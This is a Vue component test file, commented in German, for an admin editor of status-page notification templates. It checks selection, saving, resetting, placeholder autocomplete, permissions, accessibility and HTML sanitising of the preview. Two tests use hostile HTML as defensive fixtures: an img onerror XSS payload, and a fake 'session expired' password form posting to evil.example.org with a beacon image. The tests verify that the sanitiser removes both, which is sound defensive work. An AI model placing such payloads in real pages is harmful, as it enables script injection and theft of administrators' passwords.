// happy-dom (das globale Test-Environment dieses Projekts) implementiert das
// DOM-API zu unvollständig für DOMPurify - Payloads werden
// nicht zuverlässig entfernt. Nur diese Datei läuft deshalb unter jsdom.
// @vitest-environment jsdom
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import { mount, flushPromises } from '@vue/test-utils'
import i18n from '../../i18n'
import { useAuth } from '../../composables/useAuth'
import { useTenant } from '../../composables/useTenant'
import { onyxFormStubs } from '../../test-support/onyxStubs'
import AdminNotificationTemplates from './AdminNotificationTemplates.vue'
import { axe } from '../../test-support/axe.js'
import { stubConfirm } from '../../test-support/confirm'

// previewBody kommt vom Backend-Preview-Endpoint (admin-editierbares
// BodyHTML mit Go-Template-Platzhaltern) und wird per v-html gerendert. Diese
// Tests decken ab, dass ein XSS-Payload im Preview-HTML vor dem Rendern per
// DOMPurify entfernt wird, während harmloses Markup erhalten bleibt.

function jsonResponse(body, status = 200) {
  return { ok: status < 400, status, json: async () => body }
}

const customTemplate = {
  Kind: 'incident_created', Audience: 'staff', Language: 'en',
  Subject: 'Eigener Betreff', BodyHTML: '<p>Eigener Text</p>', UpdatedAt: '2026-08-01T10:00:00Z',
}

function makeFetchRouter({ previewOverride, templates = [], writeOk = true, previewOk = true } = {}) {
  return vi.fn(async (url, options = {}) => {
    const method = options.method || 'GET'
    if (method === 'GET' && /\/notification-templates$/.test(url)) {
      return jsonResponse(templates)
    }
    if ((method === 'PUT' || method === 'DELETE') && /\/notification-templates\//.test(url)) {
      return writeOk ? jsonResponse({}) : jsonResponse({ error: 'Schreiben fehlgeschlagen' }, 500)
    }
    if (method === 'POST' && /\/preview$/.test(url) && !previewOk) {
      return jsonResponse({ error: 'Vorschau kaputt' }, 500)
    }
    if (method === 'GET' && /\/languages$/.test(url)) {
      return jsonResponse([])
    }
    if (method === 'POST' && /\/preview$/.test(url)) {
      return jsonResponse(previewOverride ?? { subject: 'Test-Betreff', bodyHTML: '<p>Harmloser Text</p>' })
    }
    throw new Error(`Unerwarteter Fetch-Aufruf: ${method} ${url}`)
  })
}

let activeWrapper = null

async function mountView({ fetchImpl, tenantId = '1', attachTo, globalAdmin = true } = {}) {
  useAuth().setAuth('jwt-1', { email: 'a@b.de', is_global_admin: globalAdmin })
  useTenant().setActiveTenant(tenantId)
  global.fetch = fetchImpl || makeFetchRouter()

  const wrapper = mount(AdminNotificationTemplates, {
    global: { plugins: [i18n], stubs: onyxFormStubs },
    attachTo,
  })
  await flushPromises()
  activeWrapper = wrapper
  return { wrapper }
}

describe('AdminNotificationTemplates', () => {
  beforeEach(() => {
    useAuth().logout()
    useTenant().setActiveTenant(null)
    vi.spyOn(console, 'error').mockImplementation(() => {})
    i18n.global.locale.value = 'de'
  })

  afterEach(() => {
    activeWrapper?.unmount()
    activeWrapper = null
    vi.restoreAllMocks()
  })

  // Richtung C: Editor und Vorschau stehen in Karten mit Kartenkopf.
  it('zeigt den Editor in einer Karte mit Kopf und Hinweis, ob eine eigene Vorlage aktiv ist', async () => {
    const { wrapper } = await mountView()
    expect(wrapper.find('.comp-card__title').text()).toBe('Vorlage bearbeiten')
    expect(wrapper.find('.comp-card__head .tag-pill').text()).toBe('Standardvorlage')
    expect(wrapper.find('.comp-card__head .tag-pill--accent').exists()).toBe(false)

    const { wrapper: custom } = await mountView({ fetchImpl: makeFetchRouter({ templates: [customTemplate] }) })
    expect(custom.find('.comp-card__head .tag-pill--accent').text()).toBe('Eigene Vorlage')
  })

  // Die drei Auswahlfelder (Typ, Zielgruppe, Sprache) schreiben ihren
  // Wert in den Zustand zurück und zeigen dann die passende eigene Vorlage.
  it('wählt über die drei Auswahlfelder Typ, Zielgruppe und Sprache die passende Vorlage', async () => {
    const { wrapper } = await mountView({ fetchImpl: makeFetchRouter({ templates: [customTemplate] }) })
    const accent = () => wrapper.find('.comp-card__head .tag-pill--accent').exists()
    expect(accent()).toBe(true)

    const selects = wrapper.findAll('.onyx-select-stub select')
    expect(selects).toHaveLength(3)
    await selects[0].setValue('incident_updated')
    expect(wrapper.vm.selectedKind).toBe('incident_updated')
    expect(accent()).toBe(false)
    await selects[0].setValue('incident_created')
    await selects[1].setValue('subscriber')
    expect(wrapper.vm.selectedAudience).toBe('subscriber')
    expect(accent()).toBe(false)
    await selects[1].setValue('staff')
    await selects[2].setValue('de')
    expect(wrapper.vm.selectedLanguage).toBe('de')
    expect(accent()).toBe(false)
    await selects[2].setValue('en')
    expect(accent()).toBe(true)
  })

  it('lässt den Editor-Kasten überlaufen, damit die Platzhalter-Vorschläge nicht abgeschnitten werden', async () => {
    const { wrapper } = await mountView()
    expect(wrapper.find('section.comp-card').classes()).toContain('comp-card--visible')
  })

  // Regression 2026-10-29: Nach „Vorschau“ blieb die Ansicht oben bei der
  // Erfolgsmeldung, die Vorschau unter dem Formular musste man suchen.
  it('springt nach der Vorschau zur Vorschau und setzt den Fokus auf deren Überschrift', async () => {
    const scrollSpy = vi.fn()
    const orig = Element.prototype.scrollIntoView
    Element.prototype.scrollIntoView = scrollSpy
    try {
      const { wrapper } = await mountView({ attachTo: document.body })
      wrapper.vm.subject = '{{.Title}}'
      wrapper.vm.body = '<p>{{.Message}}</p>'
      await wrapper.vm.preview()
      await flushPromises()

      const heading = wrapper.find('h3.preview-heading')
      expect(heading.exists()).toBe(true)
      expect(scrollSpy).toHaveBeenCalledTimes(1)
      expect(scrollSpy.mock.contexts[0]).toBe(heading.element)
      expect(scrollSpy).toHaveBeenCalledWith({ behavior: 'smooth', block: 'start' })
      expect(document.activeElement).toBe(heading.element)
    } finally {
      Element.prototype.scrollIntoView = orig
    }
  })

  it('springt nicht, wenn die Vorschau leer zurückkommt (kein Vorschau-Block)', async () => {
    const scrollSpy = vi.fn()
    const orig = Element.prototype.scrollIntoView
    Element.prototype.scrollIntoView = scrollSpy
    try {
      const { wrapper } = await mountView({ fetchImpl: makeFetchRouter({ previewOverride: { subject: '', bodyHTML: '' } }) })
      wrapper.vm.subject = '{{.Title}}'
      wrapper.vm.body = '<p>x</p>'
      await wrapper.vm.preview()
      await flushPromises()
      expect(wrapper.find('h3.preview-heading').exists()).toBe(false)
      expect(scrollSpy).not.toHaveBeenCalled()
    } finally {
      Element.prototype.scrollIntoView = orig
    }
  })

  it('springt bei fehlgeschlagener Vorschau nicht', async () => {
    const scrollSpy = vi.fn()
    const orig = Element.prototype.scrollIntoView
    Element.prototype.scrollIntoView = scrollSpy
    try {
      const { wrapper } = await mountView({ fetchImpl: makeFetchRouter({ previewOk: false }) })
      wrapper.vm.subject = '{{.Title}}'
      wrapper.vm.body = '<p>x</p>'
      await wrapper.vm.preview()
      await flushPromises()
      expect(scrollSpy).not.toHaveBeenCalled()
    } finally {
      Element.prototype.scrollIntoView = orig
    }
  })

  it('strips <script> payloads from the preview HTML before rendering', async () => {
    const { wrapper } = await mountView({
      fetchImpl: makeFetchRouter({
        previewOverride: {
          subject: 'Betreff',
          bodyHTML: '<p>Hallo</p><img src=x onerror="window.__xss=true">',
        },
      }),
    })

    wrapper.vm.subject = '[ALERT] {{.IncidentTitle}}'
    wrapper.vm.body = '<p>{{.Message}}</p>'
    await wrapper.vm.preview()
    await flushPromises()

    const previewHtml = wrapper.find('.comp-card:last-of-type .form-group:last-of-type div').html()
    expect(previewHtml).toContain('Hallo')
    expect(previewHtml).not.toContain('onerror')
    expect(previewHtml).not.toContain('<script')
    expect(window.__xss).toBeUndefined()
  })

  // Eine Vorlage mit Formular, Eingabefeld und Bild darf in der Vorschau nicht
  // als Phishing-Maske für andere Admins erscheinen.
  it('zeigt Formulare, Eingabefelder, Bilder und Style-Blöcke aus der Vorlage nicht in der Vorschau', async () => {
    const payload = '<style>.ph{position:fixed;inset:0;background:#fff;z-index:99999}</style>' +
      '<form class="ph" action="https://evil.example.org/collect" method="post">Sitzung abgelaufen - bitte Passwort eingeben' +
      '<input type="password" name="pw"><button>Anmelden</button></form><img src="https://evil.example.org/beacon.gif"><p>Hallo</p>'
    const { wrapper } = await mountView({
      fetchImpl: makeFetchRouter({ previewOverride: { subject: 'S', bodyHTML: payload } }),
    })
    wrapper.vm.subject = 'x'
    wrapper.vm.body = 'y'
    await wrapper.vm.preview()
    await flushPromises()

    const box = wrapper.findAll('.preview-box').at(-1)
    expect(box.text()).toContain('Hallo')
    for (const tag of ['form', 'input', 'button', 'img', 'style']) {
      expect(box.find(tag).exists(), tag).toBe(false)
    }
  })

  it('keeps harmless formatting markup intact', async () => {
    const { wrapper } = await mountView()

    wrapper.vm.subject = '[ALERT] {{.IncidentTitle}}'
    wrapper.vm.body = '<p>{{.Message}}</p>'
    await wrapper.vm.preview()
    await flushPromises()

    expect(wrapper.vm.sanitizedPreviewBody).toBe('<p>Harmloser Text</p>')
  })

  // Laden -> Fehlerfall -> Speichern/Zurücksetzen/Vorschau werden
  // ausdrücklich per flushPromises abgewartet, damit die Coverage nicht vom
  // Timing abhängt.
  it('füllt den Editor aus der vorhandenen Vorlage und zeigt den Hinweis auf die eigene Vorlage', async () => {
    const { wrapper } = await mountView({ fetchImpl: makeFetchRouter({ templates: [customTemplate] }) })

    expect(wrapper.vm.subject).toBe('Eigener Betreff')
    expect(wrapper.vm.body).toBe('<p>Eigener Text</p>')
    expect(wrapper.vm.hasCustomTemplate).toBe(true)

    wrapper.vm.selectedKind = 'incident_updated'
    await flushPromises()
    expect(wrapper.vm.subject).toBe('')
    expect(wrapper.vm.hasCustomTemplate).toBe(false)
  })

  it('zeigt eine Fehlermeldung, wenn das Laden fehlschlägt', async () => {
    const fetchImpl = vi.fn(async () => jsonResponse({ error: 'kaputt' }, 500))
    const { wrapper } = await mountView({ fetchImpl })

    expect(wrapper.find('.alert-error').exists()).toBe(true)
  })

  it('speichert per PUT und lädt die Vorlagen neu; ohne Pflichtfelder wird nicht gespeichert', async () => {
    const fetchMock = makeFetchRouter()
    const { wrapper } = await mountView({ fetchImpl: fetchMock })

    await wrapper.find('form.edit-form').trigger('submit.prevent')
    await flushPromises()
    expect(wrapper.find('.alert-warning').exists()).toBe(true)
    expect(fetchMock.mock.calls.some(([, o]) => o?.method === 'PUT')).toBe(false)

    wrapper.vm.subject = 'Betreff'
    wrapper.vm.body = '<p>Text</p>'
    await wrapper.find('form.edit-form').trigger('submit.prevent')
    await flushPromises()

    const put = fetchMock.mock.calls.find(([, o]) => o?.method === 'PUT')
    expect(put[0]).toBe('/api/pages/1/notification-templates/incident_created/staff/en')
    expect(JSON.parse(put[1].body)).toEqual({ Subject: 'Betreff', BodyHTML: '<p>Text</p>' })
    expect(wrapper.find('.alert-success').exists()).toBe(true)
    expect(fetchMock.mock.calls.filter(([, o]) => !o?.method).length).toBeGreaterThanOrEqual(2)
  })

  it('zeigt eine Fehlermeldung, wenn das Speichern fehlschlägt', async () => {
    const { wrapper } = await mountView({ fetchImpl: makeFetchRouter({ writeOk: false }) })

    wrapper.vm.subject = 'Betreff'
    wrapper.vm.body = '<p>Text</p>'
    await wrapper.find('form.edit-form').trigger('submit.prevent')
    await flushPromises()

    expect(wrapper.find('.alert-error').text()).toContain('Schreiben fehlgeschlagen')
    expect(wrapper.vm.isSaving).toBe(false)
  })

  it('setzt eine eigene Vorlage nach Bestätigung per DELETE zurück, ohne eigene Vorlage nur mit Hinweis', async () => {
    const fetchMock = makeFetchRouter({ templates: [customTemplate] })
    const { wrapper } = await mountView({ fetchImpl: fetchMock })

    stubConfirm(false)
    await wrapper.vm.resetToDefault()
    await flushPromises()
    expect(fetchMock.mock.calls.some(([, o]) => o?.method === 'DELETE')).toBe(false)

    stubConfirm(true)
    await wrapper.vm.resetToDefault()
    await flushPromises()
    expect(fetchMock).toHaveBeenCalledWith(
      '/api/pages/1/notification-templates/incident_created/staff/en',
      expect.objectContaining({ method: 'DELETE' }),
    )
    expect(wrapper.find('.alert-success').exists()).toBe(true)

    wrapper.vm.selectedKind = 'incident_updated'
    await flushPromises()
    await wrapper.vm.resetToDefault()
    expect(wrapper.find('.alert-info').exists()).toBe(true)
  })

  it('zeigt eine Fehlermeldung, wenn das Zurücksetzen fehlschlägt', async () => {
    stubConfirm(true)
    const { wrapper } = await mountView({ fetchImpl: makeFetchRouter({ templates: [customTemplate], writeOk: false }) })

    await wrapper.vm.resetToDefault()
    await flushPromises()

    expect(wrapper.find('.alert-error').text()).toContain('Schreiben fehlgeschlagen')
    expect(wrapper.vm.isResetting).toBe(false)
  })

  it('verlangt für die Vorschau Pflichtfelder und meldet Vorschau-Fehler', async () => {
    const { wrapper } = await mountView({ fetchImpl: makeFetchRouter({ previewOk: false }) })

    await wrapper.vm.preview()
    await flushPromises()
    expect(wrapper.find('.alert-warning').exists()).toBe(true)

    wrapper.vm.subject = 'Betreff'
    wrapper.vm.body = '<p>Text</p>'
    await wrapper.vm.preview()
    await flushPromises()
    expect(wrapper.find('.alert-error').text()).toContain('Vorschau kaputt')
    expect(wrapper.vm.isPreviewing).toBe(false)
  })

  // Die Bestätigungsmail des Double-Opt-in ist als eigener Kind
  // editierbar und bringt den Platzhalter {{.ConfirmURL}} mit.
  it('bietet die Abonnement-Bestätigungsmail als Kind und den ConfirmURL-Platzhalter an', async () => {
    const { wrapper } = await mountView()

    expect(wrapper.vm.kindOptions).toContainEqual({ label: 'Abonnement-Bestätigung (Double-Opt-in)', value: 'subscription_confirm' })
    expect(wrapper.vm.placeholders).toContainEqual({ name: 'ConfirmURL', key: '{{.ConfirmURL}}', desc: 'Bestätigungslink des Abonnements (nur Abonnement-Bestätigung)' })
  })

  // Die sechs Ereignisse zu externen Meldungen und die
  // Platzhalter SourceName/SourceURL waren im Backend gültig, im Editor nicht wählbar.
  it('bietet die Ereignisse externer Meldungen und die Quellen-Platzhalter an und stellt die Zielgruppe um', async () => {
    const { wrapper } = await mountView()

    const values = wrapper.vm.kindOptions.map(o => o.value)
    for (const kind of ['incident', 'maintenance']) {
      for (const action of ['created', 'updated', 'resolved']) {
        expect(values).toContain(`external_${kind}_${action}`)
      }
    }
    const names = wrapper.vm.placeholders.map(p => p.name)
    expect(names).toContain('SourceName')
    expect(names).toContain('SourceURL')

    expect(wrapper.vm.selectedAudience).toBe('staff')
    wrapper.vm.selectedKind = 'external_incident_created'
    await flushPromises()
    expect(wrapper.vm.selectedAudience).toBe('subscriber')
  })

  it('verwendet die Sprachen der Statusseite als Auswahl', async () => {
    const fetchImpl = vi.fn(async (url) => (/\/notification-templates$/.test(url)
      ? jsonResponse([])
      : jsonResponse([{ ID: 1, LanguageCode: 'fr', IsDefault: true }])))
    const { wrapper } = await mountView({ fetchImpl })

    expect(wrapper.vm.availableLanguageOptions).toEqual([{ label: 'fr', value: 'fr' }])
  })

  it('hat keine axe-Funde im Editor', async () => {
    const { wrapper } = await mountView()
    expect(await axe(wrapper)).toHaveNoViolations()
  })
})

// Platzhalter per Klick einfügen, Autovervollständigung bei `{`
// und die native Pflichtfeld-Meldung „Fülle dieses Feld aus.“.
describe('AdminNotificationTemplates – Platzhalter', () => {
  beforeEach(() => {
    useAuth().logout()
    useTenant().setActiveTenant(null)
    i18n.global.locale.value = 'de'
    // jsdom kennt kein scrollIntoView; die Vorschlagsliste ruft es für den
    // aktiven Eintrag auf.
    Element.prototype.scrollIntoView = vi.fn()
  })

  afterEach(() => {
    activeWrapper?.unmount()
    activeWrapper = null
    delete Element.prototype.scrollIntoView
    vi.restoreAllMocks()
  })

  const mountAttached = () => mountView({ attachTo: document.body })
  const insertButton = (wrapper, key) => wrapper.find(`button[aria-label="Platzhalter ${key} einfügen"]`)

  // Tippen simulieren: Wert und Cursor setzen, input-Event auslösen (bubbelt
  // wie im Browser zum Wrapper, der Stub aktualisiert das v-model).
  async function typeInto(field, value, cursor = value.length) {
    field.element.value = value
    field.element.setSelectionRange(cursor, cursor)
    await field.trigger('input')
  }

  it('übergibt die Beispielwerte als echte Strings statt als wörtlichen Mustache-Code', async () => {
    const { wrapper } = await mountView()
    expect(wrapper.findComponent(onyxFormStubs.OnyxInput).props('placeholder')).toBe('[ALERT] {{.ComponentNames}}: {{.IncidentTitle}}')
    expect(wrapper.findComponent(onyxFormStubs.OnyxTextarea).props('placeholder')).toBe('<p>{{.Message}}</p>')
  })

  it('schaltet die native Formularvalidierung ab, damit Chrome kein „Fülle dieses Feld aus.“ zeigt', async () => {
    const { wrapper } = await mountView()
    const form = wrapper.find('form.edit-form')
    expect(form.element.noValidate).toBe(true)
    // Die eigene, übersetzte Meldung greift weiterhin.
    await form.trigger('submit.prevent')
    expect(wrapper.find('.alert-warning').text()).toBe('Betreff und Body sind Pflichtfelder.')
  })

  it('rendert jeden Platzhalter als Button mit verständlichem aria-label', async () => {
    const { wrapper } = await mountView()
    const buttons = wrapper.findAll('.placeholder-list button')
    expect(buttons).toHaveLength(wrapper.vm.placeholders.length)
    expect(buttons[0].attributes('type')).toBe('button')
    expect(buttons[0].attributes('aria-label')).toBe('Platzhalter {{.Title}} einfügen')
    expect(buttons[0].text()).toBe('{{.Title}}')
  })

  it('fügt per Klick ohne vorher fokussiertes Feld ans Ende des Bodys ein', async () => {
    const { wrapper } = await mountAttached()
    wrapper.vm.body = '<p>Hallo</p>'
    await flushPromises()

    await insertButton(wrapper, '{{.Message}}').trigger('click')
    await flushPromises()

    const textarea = wrapper.find('textarea').element
    expect(wrapper.vm.body).toBe('<p>Hallo</p>{{.Message}}')
    expect(document.activeElement).toBe(textarea)
    expect(textarea.selectionStart).toBe(wrapper.vm.body.length)
  })

  it('fügt per Klick an der Cursorposition des zuletzt fokussierten Felds ein und ersetzt die Auswahl', async () => {
    const { wrapper } = await mountAttached()
    wrapper.vm.subject = 'Störung: X heute'
    await flushPromises()
    const input = wrapper.find('input').element
    input.focus()
    input.setSelectionRange(9, 10)

    await insertButton(wrapper, '{{.Title}}').trigger('click')
    await flushPromises()

    expect(wrapper.vm.subject).toBe('Störung: {{.Title}} heute')
    expect(wrapper.vm.body).toBe('')
    expect(document.activeElement).toBe(input)
    expect(input.selectionStart).toBe(19)
    expect(input.selectionEnd).toBe(19)
  })

  it('öffnet bei `{` die Vorschlagsliste, filtert und bedient sie per Tastatur', async () => {
    const { wrapper } = await mountAttached()
    const input = wrapper.find('input')
    const listbox = wrapper.find('#notification-template-subject-listbox')
    expect(input.attributes('role')).toBe('combobox')
    expect(input.attributes('aria-expanded')).toBe('false')
    expect(input.attributes('aria-controls')).toBe('notification-template-subject-listbox')
    expect(listbox.isVisible()).toBe(false)

    input.element.focus()
    await typeInto(input, 'Neu: {')
    expect(listbox.isVisible()).toBe(true)
    expect(input.attributes('aria-expanded')).toBe('true')
    expect(listbox.findAll('[role="option"]')).toHaveLength(wrapper.vm.placeholders.length)

    await typeInto(input, 'Neu: {{.Sta')
    const options = listbox.findAll('[role="option"]')
    expect(options.map(o => o.find('code').text())).toEqual(['{{.Status}}', '{{.StatusLabel}}'])
    expect(options[0].text()).toContain('Roher Status-Wert')
    expect(input.attributes('aria-activedescendant')).toBe('notification-template-subject-option-0')
    expect(options[0].attributes('aria-selected')).toBe('true')

    await input.trigger('keydown', { key: 'ArrowDown' })
    expect(input.attributes('aria-activedescendant')).toBe('notification-template-subject-option-1')
    expect(options[1].attributes('aria-selected')).toBe('true')
    await flushPromises()
    expect(Element.prototype.scrollIntoView).toHaveBeenCalledWith({ block: 'nearest' })

    await input.trigger('keydown', { key: 'Enter' })
    await flushPromises()
    expect(wrapper.vm.subject).toBe('Neu: {{.StatusLabel}}')
    expect(input.element.selectionStart).toBe(21)
    expect(listbox.isVisible()).toBe(false)
    expect(input.attributes('aria-activedescendant')).toBeUndefined()
  })

  it('schließt die Liste mit Escape, beim Verlassen des Felds und wenn der Cursor das Präfix verlässt', async () => {
    const { wrapper } = await mountAttached()
    const textarea = wrapper.find('textarea')
    const listbox = wrapper.find('#notification-template-body-listbox')
    expect(textarea.attributes('role')).toBeUndefined()
    expect(textarea.attributes('aria-autocomplete')).toBe('list')

    textarea.element.focus()
    await typeInto(textarea, '{{')
    expect(listbox.isVisible()).toBe(true)
    await textarea.trigger('keydown', { key: 'Escape' })
    expect(listbox.isVisible()).toBe(false)
    expect(wrapper.vm.body).toBe('{{')

    await typeInto(textarea, '{{')
    await textarea.trigger('focusout')
    expect(listbox.isVisible()).toBe(false)

    await typeInto(textarea, 'a {{')
    textarea.element.setSelectionRange(1, 1)
    await textarea.trigger('keyup', { key: 'ArrowLeft' })
    expect(listbox.isVisible()).toBe(false)

    await typeInto(textarea, 'a {{')
    textarea.element.setSelectionRange(1, 1)
    await textarea.trigger('click')
    expect(listbox.isVisible()).toBe(false)
  })

  it('übernimmt einen Vorschlag per Klick und ersetzt das Präfix', async () => {
    const { wrapper } = await mountAttached()
    const textarea = wrapper.find('textarea')
    textarea.element.focus()
    await typeInto(textarea, '<p>{{.Me</p>', 8)

    const option = wrapper.find('#notification-template-body-listbox [role="option"]')
    await option.trigger('mousedown')
    await option.trigger('click')
    await flushPromises()

    expect(wrapper.vm.body).toBe('<p>{{.Message}}</p>')
    expect(document.activeElement).toBe(textarea.element)
    expect(textarea.element.selectionStart).toBe(15)

    // Auch im Betreff übernimmt ein Klick.
    const input = wrapper.find('input')
    input.element.focus()
    await typeInto(input, '{')
    await wrapper.find('#notification-template-subject-listbox [role="option"]').trigger('click')
    await flushPromises()
    expect(wrapper.vm.subject).toBe('{{.Title}}')
  })

  it('hat mit geöffneter Vorschlagsliste und aufgeklappter Platzhalterliste keine axe-Funde', async () => {
    const { wrapper } = await mountAttached()
    wrapper.find('details').element.open = true
    const input = wrapper.find('input')
    input.element.focus()
    await typeInto(input, '{{.')
    expect(wrapper.find('#notification-template-subject-listbox').isVisible()).toBe(true)
    expect(await axe(wrapper)).toHaveNoViolations()
  })

  // Die Vorschau ist im Backend eine Leseaktion (notification_templates:read); ein
  // Viewer sah den Knopf trotz 403 beim Laden.
  it('blendet Speichern und Zurücksetzen ohne notification_templates:update/delete aus, die Vorschau bleibt', async () => {
    useTenant().setMyPages([{ ID: 1, Permissions: 'components:read,incidents:read,notices:read' }])
    const { wrapper } = await mountView({ globalAdmin: false })
    const labels = wrapper.findAll('button').map(b => b.text())
    expect(labels).not.toContain('Speichern')
    expect(labels).not.toContain('Zurücksetzen')
    // Die Vorschau rendert nur und ist eine Leseaktion, sie bleibt für jeden Leser.
    expect(labels).toContain('Vorschau')
    useTenant().setMyPages([])
  })

  it('zeigt die Vorschau mit notification_templates:update auf der Seite', async () => {
    useTenant().setMyPages([{ ID: 1, Permissions: 'notification_templates:update,notification_templates:delete' }])
    const { wrapper } = await mountView({ globalAdmin: false })
    expect(wrapper.findAll('button').map(b => b.text())).toContain('Vorschau')
    useTenant().setMyPages([])
  })
  // Nach „Auf Default zurücksetzen“ zeigten die Felder sofort „Pflichtfeld“ (Onyx merkt sich die
  // Änderung am Feld). Die Felder müssen frisch gemountet werden, damit sie unberührt sind.
  it('mountet das Formular nach dem Zurücksetzen auf Default neu, damit die Felder unberührt sind', async () => {
    stubConfirm(true)
    const { wrapper } = await mountView({ fetchImpl: makeFetchRouter({ templates: [customTemplate] }) })
    const before = wrapper.find('form.edit-form').element

    await wrapper.vm.resetToDefault()
    await flushPromises()

    expect(wrapper.find('form.edit-form').element).not.toBe(before)
  })
})
